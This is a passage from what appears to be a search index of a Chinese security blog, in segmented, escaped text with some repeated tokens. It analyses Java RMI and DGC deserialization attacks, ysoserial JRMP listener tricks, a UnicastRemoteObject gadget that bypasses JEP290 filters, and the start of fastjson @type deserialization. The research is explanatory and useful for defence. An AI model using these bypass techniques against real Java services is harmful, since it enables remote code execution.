\u63a5\u6536 \u8fdc\u7a0b \u7ed1\u5b9a \u5bf9\u8c61 \u65f6\u6240 \u53d1\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u90a3\u4e48 RMI   Client \u5728 \u63a5\u6536 Server \u7aef\u7684 \u6570\u636e \u65f6 \u662f\u5426 \u4e5f \u4f1a \u53d1\u751f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u5462 \uff1f \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u6bd5\u7adf RMI \u4ea4\u4e92 \u8fc7\u7a0b \u4e2d \u7684 \u6570\u636e \u91c7\u7528 \u7684 \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u6570\u636e \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u5b58\u5728 \u7740 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u3002   \u770b \u4e00\u4e0b JRMPListener \u7684 \u4ee3\u7801 \uff0c \u7b80\u5355 \u6765\u8bf4 \uff0c \u5176 \u5b9e\u73b0 \u4e86 \u4e0e RMI   Client \u7684 \u4ea4\u4e92 \u6d41\u7a0b \u3002 \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u770b \u91cd\u70b9 \u7684 \u4ee3\u7801   \u5728 \u5b8c\u6210 \u524d\u9762 \u7684 \u4e00\u4e9b \u4ea4\u4e92 \u6b65\u9aa4 \u540e \uff0c Listener \u4f1a \u5411 Client \u53d1\u9001 \u4e00\u4e2a ExceptionalReturn \u7684 \u72b6\u6001 \uff0c \u5e76 \u5c06 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 payload \u586b\u5145 \u5230 BadAttributeValueExpException \u7684 val \u5c5e\u6027 \u3002 \u8fd9\u91cc \u7528 \u7684 BadAttributeValueExpException \u5e76 \u4e0d\u662f \u6211\u4eec \u4ee5\u524d \u5206\u6790 \u65f6 \u505a \u7684 toString \u89e6\u53d1 \u70b9 \uff0c \u800c\u662f \u4ec5 \u4f5c\u4e3a payload \u7684 \u4e00\u4e2a \u8f7d\u4f53 \uff0c \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 BadAttributeValueExpException \u7684 val \u5c5e\u6027 \u65f6 \u540c\u6837 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e86 \u6211\u4eec \u7684 payload \u3002   \u800c \u4f4d\u4e8e Client \u5728 \u63a5\u6536 \u5230 ExceptionalReturn \u65f6 \u7684 \u5904\u7406 \u65b9\u5f0f \u89c1   sun / rmi / transport / StreamRemoteCall . java # executeCall   \u524d\u9762 \u7684 \u5206\u6790 \u90fd \u7701\u7565 \u4e86   \u5728 \u8fd9\u91cc \u6211\u4eec \u770b\u5230 \u4e86 \u719f\u6089 \u7684 readObject \u51fd\u6570 \uff0c \u5176 \u7528\u4e8e \u5c06 \u524d\u9762 \u7684 Exception \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5230 \u8fd9\u91cc \u5c31 \u53ef\u4ee5 \u4e32 \u8d77\u6765 \u4e86 \uff0c Client \u53d1\u8d77 RMI \u8fde\u63a5 \uff0c \u8fde\u63a5 \u5230 \u6211\u4eec \u7684 \u6076\u610f Listener \u4e0a\u9762 \u3002 \u800c \u6211\u4eec \u7684 Listener \u5c06 \u8fd4\u56de \u4e00\u4e2a \u6784\u9020 \u597d \u7684 Exception \uff0c \u65e8\u5728 Client \u63a5\u6536 \u5230 ExceptionalReturn \u7684 \u4fe1\u53f7 \u65f6 \u8fdb\u884c \u8fd8\u539f \uff0c \u4ece\u800c \u9020\u6210 \u4e86 RMI   Client \u7aef \u4e5f \u53d7\u5230 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u653b\u51fb \u3002","title":"0x05   \u756a\u5916 \uff1a ysoserial \u4e2d \u7684 JRMPListener \u4e0e JRMPClient"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x06","text":"\u524d \u6587 \u4e3b\u8981 \u8bb2\u8bc9 \u4e86 RMI \u7684 \u76f8\u5173 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \uff0c \u5305\u62ec RMI   Registry \u548c RMI   Client \u63a5\u6536 \u5230 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u65f6 \u4ea7\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002   \u5168\u6587 \u6240 \u4f7f\u7528 \u7684 JDK \u7248\u672c \u4e3a JDK8 \uff0c \u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u5728 \u6700\u8fd1 \u7684 JDK8u \u7248\u672c \u4e0a \uff0c \u5df2 \u65e0\u6cd5 \u5bf9 RMI   Registry \u53d1\u8d77 \u653b\u51fb \uff0c \u4f46 \u5176 \u5728 JDK8u232 _ b09 \u4e4b\u524d \u7684 \u7248\u672c \u8fd8\u662f \u53ef\u4ee5 \u7684 \u3002   \u672c\u6587 \u4e3b\u8981 \u653b\u51fb \u7684 \u662f RMI   Registry \uff0c \u800c RMI \u7684 \u653b\u51fb \u653b\u51fb\u9762 \u4e0d \u5355\u5355 \u6587\u4e2d \u63d0\u5230 \u7684 \u8fd9\u79cd \u65b9\u5f0f \uff0c \u8fd8 \u5b58\u5728   \u9488\u5bf9 codebase \u7684 \u653b\u51fb \u89c1 https : / / github . com / vulhub / vulhub / blob / master / java / rmi - codebase / README . md \uff0c \u52a0\u8f7d \u6211\u4eec \u6784\u9020 \u597d \u7684 class \u3002 \u5f53\u7136 \u73b0\u5728 \u8fd9\u79cd \u60c5\u51b5 \u6bd4\u8f83 \u5c11 \u4e86 \u3002   \u9488\u5bf9 \u7ed1\u5b9a \u7684 \u5371\u9669 obj \u7684 \u653b\u51fb \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 list \u6240\u6709 \u7ed1\u5b9a \u7684 obj \uff0c \u67e5\u627e \u5371\u9669 \u7684 \u7ed1\u5b9a \u5730\u5740 \u8fdb\u884c \u653b\u51fb \u3002 \u8fd9\u91cc \u7684 \u5371\u9669 \u600e\u4e48 \u5b9a\u4e49 \u5462 \uff1f \u7b2c\u4e00 \u662f \u7ed1\u5b9a \u7684 \u5bf9\u8c61 \u786e\u5b9e \u5b58\u5728 \u64cd\u4f5c \u7cfb\u7edf \u64cd\u4f5c\u7cfb\u7edf \u547d\u4ee4 \u7b49 \uff1b \u7b2c\u4e8c \u662f \u8be5 \u5bf9\u8c61 \u7684 \u7c7b \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e2d \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u70b9 \uff0c \u6bd4\u5982 hello ( HashTable   xxx ) \uff0c \u5176\u4e2d \u7684 HashTable \u662f CommonsCollections7 \u7684 \u89e6\u53d1 \u70b9 \uff0c \u5728 \u4f20\u9012 \u8fc7\u7a0b \u4e2d \uff0c xxx \u4f1a \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5230 \u4e86 RMI   Server \u65f6\u4f1a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u4e5f \u5c31 \u6267\u884c \u4e86 \u6211\u4eec \u7684 payload \u3002 \u6700\u540e \uff0c \u8fd9\u91cc \u6682\u65f6 \u8fd8 \u6ca1 \u627e\u5230 \u6848\u4f8b ...","title":"0x06   \u603b\u7ed3"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x07-20200303-unicastremoteobject-gadget","text":"\u8fd9\u4e2a Gadget \u7684 \u6765\u6e90 \u662f https : / / mogwailabs . de / blog / 2020 / 02 / an - trinhs - rmi - registry - bypass /   \u7ecf\u8fc7 \u6d4b\u8bd5 \uff0c \u8fd9\u4e2a Gadget \u53ef\u4ee5 \u505a\u5230 \u8ddf JRMPClient \u4e00\u6837 \u7684 \u6548\u679c \uff0c \u4f46\u662f \u65e0\u6cd5 \u8ddf \u4e0a\u9762 \u7684 Level2 \u4e00\u6837 \u7ed5\u8fc7 \u9650\u5236 \uff0c \u539f\u56e0 \u770b \u4e0b\u9762   \u672c\u5730 \u5728 bind \u6216 rebind \u4e00\u4e2a Remote \u5bf9\u8c61 \u65f6 \uff0c \u4f1a \u5728 sun / rmi / server / MarshalOutputStream . java # replaceObject \u8fdb\u884c \u8f6c\u5316   \u539f\u6765 \u7684 \u5bf9\u8c61 \u4f1a \u88ab \u8f6c\u5316 \u5316\u6210 \u8f6c\u5316\u6210 \u4e0a\u9762 \u7684 \u4e00\u4e2a \u7ed3\u6784 \uff0c \u8fd9\u91cc \u76f4\u63a5 \u4e22\u6389 \u4e86 UnicastRemoteObject \uff0c \u81ea\u7136 \u5728 Registry \u7aef \u65e0\u6cd5 \u4ece UnicastRemoteObject \u7684 readObject \u51fd\u6570 \u5f00\u59cb \uff0c \u8fd9\u6837 \u8fd9\u4e2a Gadget \u5c31 \u65e0\u6cd5 \u6210\u529f \u5229\u7528 \u4e86 \u3002   \u8981 \u60f3 \u5229\u7528 \u8fd9\u4e2a \u94fe\u6765 \u7ed5\u8fc7 \u9650\u5236 \uff0c \u6211\u4eec \u53ef\u80fd \u5f97 \u81ea\u5df1 \u5199 \u4e00\u4e2a bind \u7684 \u8fc7\u7a0b \u624d \u53ef\u4ee5 \uff0c \u628a getTarget \u7684 \u8fc7\u7a0b \u53bb\u6389 \u76f4\u63a5 \u53d1 \u8fc7\u53bb \u3002 \u8fd9\u4e2a Gadget \u5229\u7528 \u4ef7\u503c \u6bd4\u8f83 \u4f4e XD   ps \uff1a \u8c8c\u4f3c \u53ef\u4ee5 \u901a\u8fc7 \u91cd\u5199 \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u8fd9\u91cc \u6709\u7a7a \u518d \u5206\u6790 XD","title":"0x07   20200303 \u66f4\u65b0   UnicastRemoteObject   Gadget"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#20200617-unicastremoteobject-gadget","text":"\u524d\u9762 \u5728 \u505a \u5206\u6790 \u65f6 \uff0c \u53d1\u73b0 \u5728 \u4f7f\u7528 \u8fd9\u4e2a \u5229\u7528 \u94fe \u7684 \u65f6\u5019 \uff0c \u5728 \u53d1 \u8fc7\u53bb \u4e4b\u524d \u5c31 \u4f1a \u88ab \u66ff\u6362 UnicastRef \u7684 \u95ee\u9898 \uff0c \u5bfc\u81f4 \u6211\u4eec \u53d1\u5230 Registry \u540e \u65e0\u6cd5 \u8fd8\u539f \u51fa \u6b63\u786e \u7684 jrmp \uff0c \u4eca\u5929 \u6765 \u770b\u770b \u4ed6 \u662f \u600e\u4e48 \u66ff\u6362 \u7684   java . io . ObjectOutputStream # writeObject0 # 1143   if   (   enableReplace   )   {   Object   rep   =   replaceObject   (   obj   ) ;   if   (   rep   ! =   obj   &&   rep   ! =   null   )   {   cl   =   rep   .   getClass   ( ) ;   desc   =   ObjectStreamClass   .   lookup   (   cl   ,   true   ) ;   }   obj   =   rep   ;   }   \u4ece   call . getOutputStream ( )   \u83b7\u53d6 \u5230 \u7684 outputstream \u5728 \u5199\u5165 \u5177\u4f53 \u7684 object \u65f6 \uff0c \u540e\u7eed \u4f1a \u6267\u884c \u5230 \u524d\u9762 \u7684 \u4ee3\u7801 \u4e0a \uff0c \u5224\u65ad \u662f\u5426 \u9700\u8981 enableReplace \uff08 \u9ed8\u8ba4 \u662f true \uff09 \uff0c \u6240\u4ee5 \u4f1a \u9ed8\u8ba4 \u8d70\u5230 \u6211 \u5728 3 \u6708\u4efd \u65f6 \u5206\u6790 \u7684 \u5730\u65b9 \uff0c \u628a \u6211\u4eec \u60f3\u8981 \u7684 jrmp \u8fde\u63a5 \u7ed9 \u66ff\u6362 \u6389 \u4e86 \u3002   \u6240\u4ee5 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u7684 \u65b9\u6848 \u5c31\u662f \u5c06 \u8fd9\u4e2a enableReplace \u7ed9 \u7f6e \u4e3a false \uff0c \u8fd9\u91cc \u5b9e\u73b0 \u8d77\u6765 \u5c31 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \u4e86 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u5bf9 outputstream \u505a \u53cd\u5c04 \u8c03\u7528 \uff0c \u66ff\u6362 true \u4e3a false \uff0c \u5177\u4f53 \u5b9e\u73b0 \u89c1   L34   \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u70b9 \u7684 \u662f \u8fd9 \u6761\u94fe \u5de7\u5999 \u4e4b \u5904 \u5728\u4e8e   UnicastRemoteObject \u5229\u7528 \u94fe \u7528\u5230 \u7684 \u5bf9\u8c61 \u90fd \u662f \u5728 Registry \u53ef\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u7684   \u8ddf \u524d\u9762 \u51e0\u4e2a \u5c01\u88c5 unicastref \u7684 \u601d\u8def \u4e0d\u540c \uff0c UnicastRemoteObject \u5b9e\u9645 \u5b9e\u9645\u4e0a \u662f \u4e3b\u52a8 \u5411\u5916 \u53d1\u51fa jrmp \u8fde\u63a5 \u7684 \u65b9\u5f0f \uff0c \u800c \u4e0d\u662f \u524d\u9762 \u901a\u8fc7 incomingtable \u8868 \u7684 \u65b9\u5f0f \u53bb \u89e6\u53d1 jrmp \u8fde\u63a5   \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u8bf4 \u4ed6 \u5de7\u5999 \u5462 \uff1f \u5728 > = 8u232 _ b09 \u7248\u672c \u5b58\u5728 \u4e24\u4e2a \u9650\u5236 \uff08 \u5177\u4f53 \u89c1 0x04 \uff09   \u6d88\u9664 \u4e86 \u5c01\u88c5 unicastRef \u7684 \u5a01\u80c1   \u5728 DGC \u5c42 \u6dfb\u52a0 \u4e86 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u5bfc\u81f4 \u5c31\u7b97 jrmp \u80fd \u53cd\u94fe \u4e5f \u4e0d\u80fd \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u51fa \u540d\u5355 \u767d\u540d\u5355 \u4e4b\u5916 \u7684 \u7c7b   \u800c UnicastRemoteObject \u7ed5\u8fc7 \u4e86 \u4e0a\u9762 \u7684 \u4e24\u4e2a \u9650\u5236   \u9996\u5148 \u5bf9\u4e8e \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u9650\u5236 \uff0c UnicastRemoteObject \u7684 jrmp \u53cd\u8fde \u53d1\u751f \u5728 readObject \u8fc7\u7a0b \u4e2d   \u5176\u6b21 \u5bf9\u4e8e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u9650\u5236 \uff0c \u524d\u9762 \u63d0\u5230 Registry \u80fd \u89e6\u53d1 JRMP \u53cd\u8fde \u4e3b\u8981 \u56e0\u4e3a \u662f\u56e0\u4e3a \u8c03\u7528 \u4e86   DGCClient . registerRefs   \u53bb \u5904\u7406   \u800c \u8fc7 \u8fd9\u4e2a \u70b9 \u5c31 \u9700\u8981 \u53d7\u5230 \u524d\u9762 \u63d0\u5230 \u7684 DGC \u540d\u5355 \u767d\u540d\u5355 \u7684 \u95ee\u9898 \u3002 \u600e\u4e48 \u7ed5\u8fc7 \u8fd9\u4e2a \u5730\u65b9 \uff1f \u7b80\u5355 \u7684 \u5c31\u662f \u627e \u4e00\u4e2a \u4e0d \u7ecf\u8fc7 DGCClient \u6765 \u89e6\u53d1 \u5373\u53ef \u3002   \u524d\u9762 \u5206\u6790 < 8u232 _ b09 \u65f6 \uff0c \u7528\u5230 \u7684 RemoteObjectInvocationHandler \u7684 \u65b9\u5f0f \u6765 \u89e6\u53d1 \uff0c \u4e0d\u8fc7 \u8fd9\u91cc \u5176\u5b9e \u53ea\u7528 \u5230 \u4e86 \u5c01\u88c5 UnicastRef \u7684 \u4f5c\u7528 \uff08 \u8fd9\u91cc \u63d0 \u4e00\u4e0b \u5b9e\u9645 \u89e6\u53d1 \u65f6 \u9700\u8981 \u8c03\u7528 UnicastRef . invoke \uff09 \u3002 UnicastRemoteObject \u5bf9 \u8fd9\u4e2a handler \u505a \u4e86 \u66f4 \u6df1\u5165 \u7684 \u5229\u7528 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86   java . rmi . server . RemoteObjectInvocationHandler # invokeRemoteMethod   \u8c03\u7528 \u4e86   ref . invoke   \u89e6\u53d1 jrmp \u53cd\u8fde \uff0c \u5230 \u8fd9\u91cc \u90fd \u6ca1\u6709 \u7ecf\u8fc7 DGCClient \u7684 \u8def\u5f84 \uff0c \u81ea\u7136 \u4e5f \u5c31 \u6ca1\u6709 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u9650\u5236 \u3002   \u4e0d\u8fc7 \u8fd9\u6761 \u94fe \u5230 \u4e86 8u242 \u4e5f \u5931\u6548 \u4e86 \uff0c \u4e3b\u8981 \u539f\u56e0 \u5728\u4e8e lookup \u63a5\u53e3 \u65e0\u6cd5 \u518d \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u975e string \u7c7b\u578b \u7684 object \u4e86","title":"20200617   \u66f4\u65b0 UnicastRemoteObject   Gadget"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x08-rmi-dgcysoserialexpliotsjrmpclient","text":"\u5728 JEP290 \u4e4b\u524d \uff0c RMI \u7684 DGCImpl _ skel # dipatch \u63a5\u6536 \u5904 \uff0c \u83b7\u53d6 \u5230 \u6570\u636e \u540e \uff0c \u76f4\u63a5 readObject \u9020\u6210 \u7684 \u3002   \u5728 JEP290 \u4e4b\u540e \uff0c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u505a \u4e86 \u6821\u9a8c \uff0c \u89c1 DGCImpl   \u5bfc\u81f4 \u4e86 ysoserial \u7684 exploit \u4e2d \u7684 JRMPClient \u5931\u6548","title":"0x08   RMI   DGC \u5b9e\u73b0 \u95ee\u9898 ( ysoserial . expliots . JRMPClient )"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x09-20200317","text":"\u524d\u9762 \u603b\u7ed3 \u4e2d \u63d0\u5230 \u7684 \u7b2c\u4e8c \u4e2d \u65b9\u5f0f \uff1a \u901a\u8fc7 \u5bfb\u627e \u53ef\u4ee5 \u5229\u7528 \u7684 \u7ed1\u5b9a \u5bf9\u8c61 \u7684 \u51fd\u6570 \u7684 \u53c2\u6570 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528   \u76f4\u63a5 \u8bb2 \u89e6\u53d1 \u70b9   sun / rmi / server / UnicastServerRef . java # dispatch # 338   \u5f53 \u6211\u4eec \u7f16\u5199 Client \u7aef \u5bf9 Server \u7aef \u6302\u8f7d \u7684 \u5bf9\u8c61 \u8fdb\u884c \u8fdc\u7a0b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff08 RMI \uff09 \u65f6 \uff0c Server \u7aef\u4f1a \u9010\u4e00 \u8fdb\u884c \uff08 \u83b7\u53d6 \u5230 Methtod \uff0c \u89e3\u6790 parameters \uff0c \u6700\u540e \u8fdb\u884c invoke \u8c03\u7528 \uff09 \u3002 \u800c \u5728 \u89e3\u6790 params \u65f6 \uff08 \u6211\u4eec \u8bb2\u8fc7 RMI \u8fc7\u7a0b \u4e2d \uff0c \u5bf9\u8c61 \u5747 \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u72b6\u6001 \uff09 \u6211\u4eec \u9700\u8981 \u5148\u5bf9 \u53c2\u6570 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u4e5f \u5c31\u662f \u7b2c 338 \u884c\u6240 \u505a \u7684 \u5de5\u4f5c \uff0c \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u5728 \u51fd\u6570   unmarshalParametersUnchecked   \u4e2d \u5206\u522b \u5bf9 \u6bcf\u4e2a \u53c2\u6570 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fd8\u539f   \u5982\u679c \u6240 \u63a5\u53d7 \u7684 \u7c7b\u578b \u975e \u57fa\u7840 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \uff0c \u90a3\u4e48 \u5c06 \u76f4\u63a5 \u8c03\u7528 readObject \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5e76 \u6ca1\u6709 \u524d\u9762 filter \u7684 \u9650\u5236   \u6240\u4ee5 \u5982\u679c \u627e\u5230 \u4e86 \u4e00\u4e2a Server \u7aef \u6302\u8f7d \u7684 \u5bf9\u8c61 \u5b58\u5728 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u7c7b\u578b \u4e3a Object \u3001 HashTable \u7b49 \u7c7b\u578b \u65f6 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u7a7f \u5165 \u6784\u9020 \u597d \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u3002 \u5f53\u524d \u524d\u63d0 \u8fd8\u662f Server \u7aef\u7684 \u73af\u5883 \u4e2d \u5b58\u5728 \u76f8\u5e94 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u4f9d\u8d56 \u3002","title":"0x09   \u603b\u7ed3 \u4e2d \u7b2c\u4e8c\u79cd \u65b9\u5f0f \u7684 \u89e6\u53d1 \u70b9 \uff08 20200317   \u66f4\u65b0 \uff09"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/","tags":["java"],"text":"0x00   \u524d\u8a00   \u6700\u8fd1 \u53c8 \u78b0\u4e0a \u4e86 fastjson \u7684 \u9898\u76ee \uff0c \u60f3\u7740 \u662f \u65f6\u5019 \u5206\u6790 \u4e00\u6ce2 \u8fd9\u4e2a \u6f0f\u6d1e \u4e86 \uff0c \u8ddf\u4e0a \u5e08\u5085 \u4eec \u7684 \u811a\u6b65 \u3002   0x01   \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   ( 1 ) .   fastjson \u7684 \u57fa\u7840 \u4f7f\u7528   fastjson \u662f \u963f\u91cc \u5df4\u5df4 \u963f\u91cc\u5df4\u5df4 \u7684 \u5f00\u6e90 JSON \u89e3\u6790 \u5e93 \uff0c \u5b83 \u53ef\u4ee5 \u89e3\u6790 JSON \u683c\u5f0f \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u652f\u6301 \u5c06 Java   Bean \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3a JSON \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u4e5f \u53ef\u4ee5 \u4ece JSON \u5b57\u7b26 \u5b57\u7b26\u4e32 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5230 JavaBean \u3002   \u5148 \u6765\u770b \u4e00\u4e2a \u7b80\u5355 \u7684 \u4f8b\u5b50   public   class   Phone   {   public   String   phoneNumber   ;   public   Phone   ( )   {   }   public   Phone   (   String   phoneNumber   )   {   this   .   phoneNumber   =   phoneNumber   ;   }   @ Override   public   String   toString   ( ) {   return   this   .   phoneNumber   ;   }   }   public   class   NewPhone   extends   Phone   {   public   String   location   ;   public   NewPhone   ( ) {   }   public   NewPhone   (   String   phoneNumber   ,   String   location   )   {   this   .   phoneNumber   =   phoneNumber   ;   this   .   location   =   location   ;   }   @ Override   public   String   toString   ( ) {   return   this   .   phoneNumber   +   \" : \"   +   this   .   location   ;   }   }   public   class   Person   {   public   String   name   ;   public   Phone   phone   ;   public   Person   ( )   {   }   public   Person   (   String   name   ,   Phone   phone   )   {   this   .   name   =   name   ;   this   .   phone   =   phone   ;   }   @ Override   public   String   toString   ( ) {   return   name   +   \" : \"   +   phone   ;   }   }   \u4e0a\u9762 \u5305\u62ec \u4e86 3 \u4e2a \u7b80\u5355 \u7684 \u5bf9\u8c61 Person \u3001 Phone \u4ee5\u53ca NewPhone \uff0c \u6211\u4eec \u7528 fastjson \u5c06 Person \u5bf9\u8c61 \u8f6c\u5316 \u5316\u6210 \u8f6c\u5316\u6210 \u4e00\u4e2a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u5e76 \u8fd8\u539f   Phone   phone   =   new   Phone   (   \" 1234567890 \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" name \" : \" john \" , \" phone \" : { \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890   \u8c03\u7528 fastjson \u7684 toJSONString \u53ef\u4ee5 \u8f7b\u6613 \u5730 \u5c06 object \u8f6c\u5316 \u4e3a json \u5b57\u7b26 \u5b57\u7b26\u4e32 \uff0c \u4e5f \u53ef\u4ee5 \u7528 parseObject \u5c06 json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u8fd8\u539f \u51fa\u6765 \u3002 \u4f46\u662f \u8fd9\u91cc \u6709 \u4e00\u4e2a \u9650\u5236 \u5c31\u662f   Phone   phone   =   new   NewPhone   (   \" 1234567890 \"   ,   \" China \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" name \" : \" john \" , \" phone \" : { \" location \" : \" China \" , \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890   \u5728 \u4e0a\u9762 \u7684 \u5199\u6cd5 \u4e2d \uff0c \u7531\u4e8e fastjson \u4e0d \u77e5\u9053 \u9700\u8981 \u8fd8\u539f \u7684 Person \u7684 Phone \u662f \u672c\u8eab \u8fd8\u662f \u5b50\u7c7b NewPhone \uff0c \u9762\u5bf9 \u8fd9\u79cd \u591a\u6001 \u65b9\u5f0f \uff0c fastjson \u8fd8\u539f \u662f \u7236\u7c7b \uff0c \u800c \u4e0d\u662f \u5b50\u7c7b NewPhone \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u4e22\u5931 \u4e86 Json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4e2d phone \u7684 location \u5b57\u6bb5 \u3002 \u8fd9 \u663e\u7136 \u662f \u4e0d\u53ef \u5fcd\u53d7 \u7684 \uff0c \u6240\u4ee5 fastjson \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u6307\u5b9a \u8fd8\u539f \u7c7b \u7684 \u5b57 \u6bb5   @ type   \u65b9\u6cd5   Phone   phone   =   new   NewPhone   (   \" 1234567890 \"   ,   \" China \"   ) ;   Person   person   =   new   Person   (   \" john \"   ,   phone   ) ;   String   json   =   JSON   .   toJSONString   (   person   ,   SerializerFeature   .   WriteClassName   ) ;   System   .   out   .   println   (   json   ) ;   Person   p   =   JSON   .   parseObject   (   json   ,   Person   .   class   ) ;   System   .   out   .   println   (   p   ) ;   / /   output   / /   { \" @ type \" : \" org . vultest . base . Person \" , \" name \" : \" john \" , \" phone \" : { \" @ type \" : \" org . vultest . base . NewPhone \" , \" location \" : \" China \" , \" phoneNumber \" : \" 1234567890 \" } }   / /   john : 1234567890 : China   \u901a\u8fc7 \u5728 toJSONString \u7684 \u65f6\u5019 \u6307\u5b9a SerializerFeature \uff08 SerializerFeature . WriteClassName \uff09 \uff0c \u4f7f\u5f97 \u8f6c\u5316 \u540e \u7684 json \u5b57\u7b26 \u5b57\u7b26\u4e32 \u591a \u4e86   @ type   \u5b57 \u6bb5 \u3002 \u8fd9\u4e2a \u5b57 \u6bb5 \u6307\u4ee3 \u4e86 \u5f53\u524d \u7c7b \u7684 class \uff0c \u907f\u514d \u4e86 \u4e0a\u9762 \u7684 \u5b50\u7c7b \u4e22\u5931 \u5b57\u6bb5 \u7684 \u95ee\u9898 \u3002 \u6bd4\u5982 \u4e0a\u9762 \u76f4\u63a5 \u6307\u5b9a \u4e86 Person \u5bf9\u8c61 \u7684 phone \u5c5e\u6027 \u7684 \u7c7b \u662f NewPhone \uff0c \u8fd8\u539f \u540e \u6210\u529f \u6253\u5370 \u51fa location \u3002   \u5230 \u4e86 \u8fd9\u91cc \uff0c \u6211\u4eec \u53ef\u4ee5 \u601d\u8003 \u4e00\u4e0b \uff0c \u5982\u679c   @ type   \u88ab \u6307\u5b9a \u4e3a \u67d0 \u6076\u610f \u7684 \u7c7b \uff0c \u662f\u5426 \u4f1a \u5bfc\u81f4 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u7684 \u6f0f\u6d1e \uff1f   ( 2 ) . fastjson \u7684 \u6d41\u7a0b \u7b80\u4ecb   \u8fd9\u91cc \u76f4\u63a5 \u53c2\u8003 https : / / paper . seebug . org / 994 /   \u7528 \u4e00\u4e0b \u5ed6\u5927 \u7684 \u6d41\u7a0b \u6d41\u7a0b\u56fe   \u5177\u4f53 \u7684 \u5206\u6790 \u8fc7\u7a0b \u770b \u4e0a\u9762 